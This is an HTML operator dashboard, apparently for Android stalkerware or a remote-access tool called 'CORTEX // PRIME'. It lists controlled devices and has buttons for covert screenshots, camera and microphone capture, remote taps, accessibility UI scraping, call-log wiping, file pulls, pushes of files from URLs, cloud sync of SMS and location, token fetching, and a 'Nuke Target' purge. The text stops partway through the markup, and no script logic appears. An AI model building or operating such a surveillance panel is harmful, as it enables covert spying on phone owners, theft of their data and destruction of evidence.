File:
  1 | <!DOCTYPE html>
  2 | <html lang="en">
  3 | <head>
  4 |     <meta charset="UTF-8">
  5 |     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  6 |     <title>CORTEX // PRIME</title>
  7 |     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  8 |     <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
  9 |     <style>
 10 |         :root {
 11 |             --bg: #050505;
 12 |             --surface: #0f1012;
 13 |             --surface-light: #1a1c20;
 14 |             --primary: #00f3ff;
 15 |             --secondary: #7000ff;
 16 |             --danger: #ff003c;
 17 |             --success: #00ff9d;
 18 |             --text: #c0c0c0;
 19 |             --grid: rgba(0, 243, 255, 0.05);
 20 |         }
 21 | 
 22 |         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 23 |         
 24 |         body {
 25 |             background-color: var(--bg);
 26 |             color: var(--text);
 27 |             font-family: 'Share Tech Mono', monospace;
 28 |             margin: 0;
 29 |             padding: 0;
 30 |             height: 100vh;
 31 |             display: flex;            flex-direction: column;
 32 |             overflow: hidden;
 33 |             background-image: 
 34 |                 linear-gradient(var(--grid) 1px, transparent 1px),
 35 |                 linear-gradient(90deg, var(--grid) 1px, transparent 1px);
 36 |             background-size: 20px 20px;
 37 |         }
 38 | 
 39 |         header {
 40 |             background: rgba(5, 5, 5, 0.9);
 41 |             backdrop-filter: blur(10px);
 42 |             padding: 15px;
 43 |             border-bottom: 1px solid var(--primary);
 44 |             display: flex;
 45 |             justify-content: space-between;
 46 |             align-items: center;
 47 |             z-index: 10;
 48 |             box-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
 49 |         }
 50 | 
 51 |         .logo { font-size: 1.2rem; color: var(--primary); text-shadow: 0 0 5px var(--primary); letter-spacing: 2px; }
 52 | 
 53 |         .status-dot {
 54 |             height: 8px; width: 8px; background-color: var(--danger);
 55 |             border-radius: 50%; box-shadow: 0 0 5px var(--danger);
 56 |             animation: pulse 2s infinite;
 57 |         }
 58 |         .status-dot.online { background-color: var(--success); box-shadow: 0 0 5px var(--success); }
 59 | 
 60 |         main { flex: 1; overflow-y: auto; padding: 20px; padding-bottom: 80px; }
 61 | 
 62 |         .section { display: none; animation: fadeIn 0.3s ease; }
 63 |         .section.active { display: block; }
 64 | 
 65 |         h2 {
 66 |             color: var(--bg); background: var(--primary);
 67 |             padding: 5px 10px; display: inline-block;
 68 |             font-size: 0.9rem; margin-top: 0; margin-bottom: 15px;
 69 |             text-transform: uppercase; clip-path: polygon(0 0, 100% 0, 90% 100%, 0% 100%);
 70 |         }
 71 | 
 72 |         .card { background: var(--surface); border: 1px solid var(--surface-light); border-left: 2px solid var(--primary); padding: 15px; margin-bottom: 15px; position: relative; }
 73 |         .device-row { display: flex; align-items: center; justify-content: space-between; padding: 12px; border-bottom: 1px solid #222; cursor: pointer; transition: 0.2s; }
 74 |         .device-row:hover { background: rgba(0, 243, 255, 0.05); }
 75 |         .device-row.selected { border-left: 4px solid var(--primary); background: rgba(0, 243, 255, 0.1); }
 76 |         .device-info { flex: 1; }
 77 |         .checkbox { width: 18px; height: 18px; border: 1px solid var(--primary); margin-right: 12px; display: flex; align-items: center; justify-content: center; font-size: 12px; }
 78 |         .selected .checkbox::after { content: '✔'; color: var(--primary); }
 79 | 
 80 |         .stat-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
 81 |         .stat-item label { display: block; font-size: 0.7rem; color: #666; }
 82 |         .stat-item span { font-size: 1.1rem; color: #fff; }
 83 | 
 84 |         .cmd-row { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
 85 |         .cmd-label { color: var(--primary); font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; }
 86 |         
 87 |         .input-wrap { display: flex; gap: 5px; }
 88 |         input, textarea {
 89 |             flex: 1; background: #000; border: 1px solid var(--surface-light);
 90 |             color: var(--primary); padding: 8px 12px; font-family: inherit; font-size: 0.85rem;
 91 |         }
 92 |         textarea { min-height: 60px; resize: vertical; }
 93 | 
 94 |         .btn {
 95 |             background: var(--surface-light); border: 1px solid var(--primary);
 96 |             color: var(--primary); padding: 8px 15px; font-family: inherit;
 97 |             font-size: 0.8rem; cursor: pointer; text-transform: uppercase;
 98 |             transition: all 0.2s; clip-path: polygon(5px 0, 100% 0, 100% calc(100% - 5px), calc(100% - 5px) 100%, 0 100%, 0 5px);
 99 |         }
100 |         .btn:active { transform: scale(0.95); background: var(--primary); color: #000; }
101 |         .btn.danger { border-color: var(--danger); color: var(--danger); }
102 |         .btn.danger:active { background: var(--danger); color: #fff; }
103 | 
104 |         .btn-status { width: 30px; background: rgba(0, 243, 255, 0.1); border: 1px solid #333; color: var(--primary); font-size: 0.6rem; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
105 |         .btn-status:hover { border-color: var(--primary); }
106 | 
107 |         #toast-container { position: fixed; top: 80px; right: 20px; z-index: 1000; pointer-events: none; }
108 |         .toast { background: var(--surface); border-left: 4px solid var(--primary); padding: 12px 20px; margin-bottom: 10px; font-size: 0.8rem; box-shadow: 0 5px 15px rgba(0,0,0,0.5); animation: toastIn 0.3s ease forwards; opacity: 0; }
109 |         @keyframes toastIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
110 | 
111 |         #status-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; display: none; flex-direction: column; padding: 20px; overflow-y: auto; backdrop-filter: blur(15px); }
112 |         .viewer-card { background: var(--surface); border: 1px solid #333; margin-bottom: 10px; padding: 12px; border-left: 3px solid var(--primary); }
113 |         .viewer-tag { font-size: 0.65rem; padding: 2px 6px; background: rgba(0,243,255,0.1); color: var(--primary); margin-right: 8px; border-radius: 3px; }
114 |         .viewer-ts { font-size: 0.65rem; color: #555; float: right; }
115 |         .viewer-media { max-width: 100%; border: 1px solid var(--primary); box-shadow: 0 0 15px rgba(0,243,255,0.2); margin: 20px 0; }
116 |         audio::-webkit-media-controls-panel { background-color: var(--surface-light); }
117 |         .json-key { color: var(--primary); font-weight: bold; }
118 |         .json-val { color: var(--text); }
119 | 
120 |         .log-entry { font-size: 0.8rem; padding: 8px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; }
121 |         .log-time { color: #666; font-size: 0.7rem; }
122 |         .log-tag { color: var(--secondary); margin-right: 5px; }
123 | 
124 |         nav { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--surface); border-top: 1px solid #333; display: flex; justify-content: space-around; padding: 15px 0; z-index: 100; }
125 |         .nav-item { color: #666; font-size: 1.5rem; cursor: pointer; position: relative; }
126 |         .nav-item.active { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
127 | 
128 |         #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 999; display: flex; justify-content: center; align-items: center; flex-direction: column; }
129 |         .scanline { width: 100%; height: 2px; background: var(--primary); position: absolute; animation: scan 2s linear infinite; opacity: 0.3; }
130 | 
131 |         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
132 |         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
133 |         @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
134 |     </style>
135 | </head>
136 | <body>
137 | 
138 |     <div id="toast-container"></div>
139 |     <div id="status-overlay">
140 |         <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
141 |             <h2 id="status-title" style="margin:0">COMMAND AUDIT</h2>
142 |             <div onclick="document.getElementById('status-overlay').style.display='none'" style="font-size:2rem; color:var(--primary); cursor:pointer; padding:0 10px;">×</div>
143 |         </div>
144 |         <div id="status-content" style="flex:1" onclick="event.stopPropagation()"></div>
145 |         <div style="display:flex; gap:10px; margin-top:20px;">
146 |             <button class="btn" style="flex:1" onclick="downloadActiveFile()">DOWNLOAD DATA</button>
147 |             <button class="btn" style="flex:1" onclick="document.getElementById('status-overlay').style.display='none'">CLOSE VIEW</button>
148 |         </div>
149 |     </div>
150 | 
151 |     <div id="loader">
152 |         <div style="color: var(--primary); font-size: 1.5rem; letter-spacing: 5px;">SYNCING...</div>
153 |         <div style="color: #666; margin-top: 10px; font-size: 0.8rem;">UPLINK ESTABLISHED</div>
154 |     </div>
155 | 
156 |     <header>
157 |         <div class="logo">CORTEX // PRIME</div>
158 |         <div id="connectionStatus" class="status-dot"></div>
159 |     </header>
160 | 
161 |     <main>
162 |         <div id="view-dash" class="section active">
163 |             <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 5px;">
164 |                 <h2>Active Device Cluster</h2>
165 |                 <button class="btn" onclick="fetchLatest()" style="font-size: 0.6rem; padding: 4px 8px;">REFRESH SCAN</button>
166 |             </div>
167 |             <div class="card" id="device-list-container" style="padding:0; max-height: 300px; overflow-y: auto;">
168 |                 <div style="padding:20px; text-align:center; color:#444;">Scanning for signals...</div>
169 |             </div>
170 |             
171 |             <div id="multi-select-bar" style="display:none; margin-bottom:15px; gap:10px;">
172 |                  <button class="btn" onclick="selectAll(true)">Select All</button>
173 |                  <button class="btn" onclick="selectAll(false)">Clear</button>
174 |             </div>
175 | 
176 |             <h2>Telemetry Feed <span id="feed-target-label" style="font-size:0.6rem; color:var(--primary); opacity:0.6;"></span></h2>
177 |             <div class="card" id="feed-container" style="max-height: 350px; overflow-y: auto;">
178 |                 <div style="text-align: center; color: #444;">Select a device to view feed</div>
179 |             </div>
180 |         </div>
181 | 
182 |         <div id="view-cmd" class="section">
183 |             <h2>Interference</h2>
184 |             <div class="card">
185 |                 <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('TOAST')">?</button><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
186 |                 <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('RING')">?</button><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
187 |                 <div class="cmd-row">
188 |                     <label class="cmd-label">Connectivity & Identity</label>
189 |                     <div class="input-wrap">
190 |                         <button class="btn-status" onclick="auditCmd('PING')">?</button>
191 |                         <button class="btn" style="flex:1" onclick="sendCmd('PING')">Ping Probe</button>
192 |                     </div>
193 |                     <div class="input-wrap" style="margin-top:5px">
194 |                         <button class="btn-status" onclick="auditCmd('GET_TOKEN')">?</button>
195 |                         <button class="btn" style="flex:1" onclick="sendCmd('GET_TOKEN')">Fetch Token</button>
196 |                     </div>
197 |                 </div>
198 |                 <div class="cmd-row"><label class="cmd-label">Force Wake (Screen Ignite)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('WAKE')">?</button><select id="val-wake" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="standard">Standard Wake</option><option value="wellbeing">Route to Wellbeing</option></select><button class="btn" onclick="sendCmd('WAKE')">Ignite</button></div></div>
199 |                 <div class="cmd-row">
200 |                     <label class="cmd-label">Remote Intent</label>
201 |                     <input type="text" id="int-act" value="android.intent.action.VIEW" placeholder="Action">
202 |                     <input type="text" id="int-data" placeholder="Data (URL/URI)">
203 |                     <div class="input-wrap">
204 |                         <button class="btn-status" onclick="auditCmd('RUN_INTENT')">?</button>
205 |                         <select id="int-tgt" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;">
206 |                             <option value="activity">Activity</option>
207 |                             <option value="service">Service</option>
208 |                             <option value="broadcast">Broadcast</option>
209 |                         </select>
210 |                         <button class="btn" onclick="sendCmd('RUN_INTENT')">Run</button>
211 |                     </div>
212 |                 </div>
213 |             </div>
214 | 
215 |             <h2>Surveillance (Optical / Audio / Display)</h2>
216 |             <div class="card">
217 |                 <div class="cmd-row">
218 |                     <label class="cmd-label">Display Snapshot</label>
219 |                     <div class="input-wrap">
220 |                         <button class="btn-status" onclick="auditCmd('GET_SCREENSHOT')">?</button>
221 |                         <input type="number" id="scr-quality" value="70" placeholder="Quality %" style="flex:1">
222 |                         <button class="btn" onclick="sendCmd('GET_SCREENSHOT')">Screenshot</button>
223 |                     </div>
224 |                 </div>
225 |                 <div class="cmd-row">
226 |                     <label class="cmd-label">Optical Capture</label>
227 |                     <div class="input-wrap">
228 |                         <button class="btn-status" onclick="auditCmd('CAPTURE_IMAGE')">?</button>
229 |                         <select id="cam-side" style="width:80px; background:#000; color:var(--primary); border:1px solid var(--surface-light);"><option value="REAR">Rear</option><option value="FRONT">Front</option></select>
230 |                         <input type="number" id="cam-count" value="1" placeholder="Qty" style="width:60px">
231 |                         <button class="btn" onclick="sendCmd('CAPTURE_IMAGE')">Capture</button>
232 |                     </div>
233 |                 </div>
234 |                 <div class="cmd-row">
235 |                     <label class="cmd-label">Acoustic Snippet</label>
236 |                     <div class="input-wrap">
237 |                         <button class="btn-status" onclick="auditCmd('RECORD_VOICE')">?</button>
238 |                         <input type="number" id="mic-dur" value="10" placeholder="Secs">
239 |                         <button class="btn" onclick="sendCmd('RECORD_VOICE')">Record Mic</button>
240 |                     </div>
241 |                 </div>
242 |                 <div class="cmd-row">
243 |                     <label class="cmd-label">Ghost Interaction (Remote Touch)</label>
244 |                     <div class="input-wrap">
245 |                         <button class="btn-status" onclick="auditCmd('REMOTE_TOUCH')">?</button>
246 |                         <select id="touch-act" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
247 |                             <option value="NAV|BACK">Nav: Back</option>
248 |                             <option value="NAV|HOME">Nav: Home</option>
249 |                             <option value="NAV|RECENTS">Nav: Recents</option>
250 |                             <option value="TAP">Custom Tap (X,Y)</option>
251 |                         </select>
252 |                         <input type="text" id="touch-val" placeholder="Params (if tap)" style="width:100px">
253 |                         <button class="btn" onclick="sendCmd('REMOTE_TOUCH')">Send</button>
254 |                     </div>
255 |                 </div>
256 |             </div>
257 | 
258 |             <h2>Data Extraction & Forensics</h2>
259 |             <div class="card">
260 |                 <div class="cmd-row">
261 |                     <label class="cmd-label">Accessibility Audit (UI Scraper)</label>
262 |                     <div class="input-wrap">
263 |                         <button class="btn-status" onclick="auditCmd('GET_TREE')">?</button>
264 |                         <input type="text" id="tree-pkg" placeholder="Package (null for all)">
265 |                         <input type="number" id="tree-dur" value="1" placeholder="Mins" style="width:80px">
266 |                         <button class="btn" onclick="sendCmd('GET_TREE')">Audit</button>
267 |                     </div>
268 |                 </div>
269 |                 <div class="cmd-row">
270 |                     <label class="cmd-label">Call Log Sanitizer</label>
271 |                     <div class="input-wrap">
272 |                         <button class="btn-status" onclick="auditCmd('PHONE_LOGS')">?</button>
273 |                         <select id="call-act" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
274 |                             <option value="CLEAR_ALL">Wipe All Logs</option>
275 |                             <option value="DELETE_LAST">Wipe Last (Mins)</option>
276 |                             <option value="DELETE_NUM">Wipe Number</option>
277 |                         </select>
278 |                         <input type="text" id="call-val" placeholder="Val" style="width:80px">
279 |                         <button class="btn" onclick="sendCmd('PHONE_LOGS')">Sanitize</button>
280 |                     </div>
281 |                 </div>
282 |                 <div class="cmd-row"><label class="cmd-label">Forensic File Pull</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('PULL_FILE')">?</button><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
283 |                 <div class="cmd-row">
284 |                     <label class="cmd-label">Remote Deployment (Push)</label>
285 |                     <input type="text" id="push-url" placeholder="Source URL (http://...)">
286 |                     <div class="input-wrap">
287 |                         <button class="btn-status" onclick="auditCmd('PUSH_FILE')">?</button>
288 |                         <input type="text" id="push-path" placeholder="/sdcard/Target/path.ext" style="flex:1">
289 |                         <button class="btn" onclick="sendCmd('PUSH_FILE')">Deploy</button>
290 |                     </div>
291 |                 </div>
292 |                 <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
293 |                 <div class="cmd-row"><label class="cmd-label">Vault Storage Status</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Query Vault Size</button></div></div>
294 |                 <div class="cmd-row"><label class="cmd-label">Forensic Sync (Cloud)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('UPLOAD_DUMPS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('UPLOAD_DUMPS')">Sync Vault Dumps</button></div></div>
295 |                 <div class="cmd-row"><label class="cmd-label">Diagnostic System Logs</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_LOGS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_LOGS')">Export Logcat</button></div></div>
296 |             </div>
297 | 
298 |             <h2>Maintenance</h2>
299 |             <div class="card">
300 |                 <div class="cmd-row"><label class="cmd-label">Burst Mode (Stay Ready)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('STAY_READY')">?</button><input type="number" id="val-burst" placeholder="Mins (e.g. 15)"><button class="btn" onclick="sendCmd('STAY_READY')">Activate</button></div></div>
301 |                 <div class="cmd-row"><label class="cmd-label">Work Cycle</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('SET_INTERVAL')">?</button><input type="number" id="val-work" placeholder="Mins (Min 15)"><button class="btn" onclick="sendCmd('SET_INTERVAL')">Set</button></div></div>
302 |                 <div class="cmd-row">
303 |                     <label class="cmd-label">Feature Control</label>
304 |                     <div class="input-wrap">
305 |                         <button class="btn-status" onclick="auditCmd('TOGGLE_FEATURE')">?</button>
306 |                         <input type="text" id="tog-feat" placeholder="Feature (e.g. location)">
307 |                         <select id="tog-state" style="background:#000; color:var(--primary); border:1px solid var(--surface-light);">
308 |                             <option value="on">ON</option>
309 |                             <option value="off">OFF</option>
310 |                         </select>
311 |                         <input type="number" id="tog-dur" value="0" placeholder="Mins" style="width:70px">
312 |                         <button class="btn" onclick="sendCmd('TOGGLE_FEATURE')">Set</button>
313 |                     </div>
314 |                 </div>
315 |                 <div class="cmd-row" style="margin-top:10px;">
316 |                     <label class="cmd-label">Targeted Cloud Sync</label>
317 |                     <div class="input-wrap">
318 |                         <button class="btn-status" onclick="auditCmd('FORCE_UPLOAD')">?</button>
319 |                         <input type="text" id="val-force" placeholder="Modules (e.g. sms,vitals,loc)">
320 |                         <button class="btn" onclick="sendCmd('FORCE_UPLOAD')">Sync</button>
321 |                     </div>
322 |                 </div>
323 |             </div>
324 | 
325 |             <h2 style="background: var(--danger)">Crisis Management</h2>
326 |             <div class="card" style="border-color: var(--danger)">
327 |                 <div class="cmd-row">
328 |                     <label class="cmd-label">Code Red (Beacon)</label>
329 |                     <div class="input-wrap">
330 |                         <button class="btn-status" onclick="auditCmd('CODERED')">?</button>
331 |                         <input type="text" id="cr-code" value="0" placeholder="Codes" style="width:60px">
332 |                         <input type="number" id="cr-dur" value="15" placeholder="Mins">
333 |                         <input type="number" id="cr-freq" value="30" placeholder="Freq(s)">
334 |                         <button class="btn danger" onclick="sendCmd('CODERED')">Trigger</button>
335 |                     </div>
336 |                 </div>
337 |                 <div class="cmd-row">
338 |                     <div class="input-wrap">
339 |                         <button class="btn-status" onclick="auditCmd('STOP_BEACON')">?</button>
340 |                         <button class="btn danger" style="flex:1" onclick="sendCmd('STOP_BEACON')">Dark Mode (Stop Beacon)</button>
341 |                     </div>
342 |                 </div>
343 |                 <div class="cmd-row" style="margin-top:10px;">
344 |                     <div class="input-wrap">
345 |                         <button class="btn-status" onclick="auditCmd('NUKE')">?</button>
346 |                         <button class="btn danger" style="flex:1" onclick="if(confirm('PURGE DATA & UNINSTALL?')) sendCmd('NUKE')">Nuke Target</button>
347 |                     </div>
348 |                 </div>
349 |             </div>
350 |         </div>
351 | 
352 |         <div id="view-files" class="section">
353 |             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
354 |                 <h2>Data Vault</h2>
355 |                 <button class="btn" id="vault-back-btn" onclick="vaultBack()" style="display:none; font-size:0.6rem;">← BACK</button>
356 |             </div>
357 |             <div id="vault-path-display" style="font-size: 0.6rem; color: var(--primary); margin-bottom: 10px; opacity: 0.5; overflow: hidden; text-overflow: ellipsis;">ROOT://</div>
358 |             <div id="file-list"></div>
